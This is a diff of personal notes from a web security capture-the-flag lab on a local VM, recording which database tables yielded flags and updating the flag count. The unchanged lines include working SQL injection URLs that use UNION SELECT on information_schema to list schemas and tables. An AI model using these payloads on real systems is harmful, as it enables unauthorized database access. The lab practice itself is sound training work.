@@ -36,11 +36,11 @@ grep -r '5' . # Tried ls -lR | grep flag, grep -r -i 'flag' ., etc.
   * `Member_Brute_Force, Member_Sql_Injection, Member_guestbook, Member_images, Member_survey`
   * http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+catalog_name%2C+schema_name+FROM+information_schema.schemata&Submit=Submit#
 * The databases contain the following tables:
-  * Member_Brute_Force: db_default
-  * Member_Sql_Injection: users
+  * Member_Brute_Force: db_default (flag got)
+  * Member_Sql_Injection: users (flag got)
   * Member_guestbook: guestbook
-  * Member_images: list_images
-  * Member_survey: vote_dbs
+  * Member_images: list_images (flag got)
+  * Member_survey: vote_dbs (flag got through form manipulation, not injection)
   * http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+table_schema%2C+table_name+FROM+information_schema.tables&Submit=Submit#
 * The database uses InnoDB
 
@@ -51,4 +51,4 @@ grep -r '5' . # Tried ls -lR | grep flag, grep -r -i 'flag' ., etc.
 * Trying to upload multiple images appears to discard all but one of them
 
 # Flag count
-10/14
+11/14
